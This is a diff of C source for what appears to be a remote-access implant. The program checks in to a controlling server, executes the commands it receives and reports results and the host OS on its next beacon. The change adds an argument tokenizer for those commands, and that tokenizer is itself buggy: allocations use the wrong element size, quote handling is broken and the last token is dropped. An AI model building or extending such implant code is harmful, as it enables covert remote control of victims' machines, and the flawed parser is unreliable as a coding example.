@@ -29,11 +29,6 @@ int main(int argc, char **argv){
             printf("Complete.\n");
         #endif
 
-        // TODO Finish:
-        // check-in to server & send back previous command results
-        // if command
-            // run command
-            // save results to be sent back on next beacon
         char *resp = master_checkin(master, data);
         if (data)
             free(data);
@@ -73,9 +68,7 @@ int main(int argc, char **argv){
                    data = run_cmd(cmd,NULL);
                 }
                 free(cmd);
-                //data = (char*)malloc(strlen("Triggered")+1);
             }
-            //strcpy(data, "Triggered");
         }
         if (!strncmp(resp, "get os", 7)){
             data = (char*)malloc(strlen("set os:") + strlen(OS)+1);
@@ -99,6 +92,43 @@ int main(int argc, char **argv){
     return 0;
 }
 
+char **tokenize_arg(char *cmd){
+    uint32_t cmdlen = strlen(cmd);
+    char **tokens = (char **)malloc(sizeof(char *) * cmdlen);
+    
+    int is_quote = 0;
+    uint32_t start = 0;
+    uint32_t index = 0;
+    for (uint32_t end = 0; end < cmdlen; end++){
+        if (cmd[end] == ' '){
+            if (end > start) {
+                uint32_t toklen = end - start;
+                tokens[index] = (char *)malloc(sizeof(char *) * ((toklen)+1));
+                strncpy(tokens[index],cmd+start,toklen);
+                tokens[index][toklen] = '\0';
+                start = end+1;
+                index++;
+            }
+        }
+        if (cmd[end] == '"'){
+            if (is_quote){
+                //end quote
+                if (end > start) {
+                    uint32_t toklen = end - start;
+                    tokens[index] = (char *)malloc(sizeof(char *) * ((toklen)+1));
+                    strncpy(tokens[index],cmd+start,toklen);
+                    tokens[index][toklen] = '\0';
+                    start = end+1;
+                    index++;
+                }
+            } else {
+                is_quote = 1;
+            }
+        }
+    }
+    return tokens;
+
+}
 /*
  * Initalize connection
  */
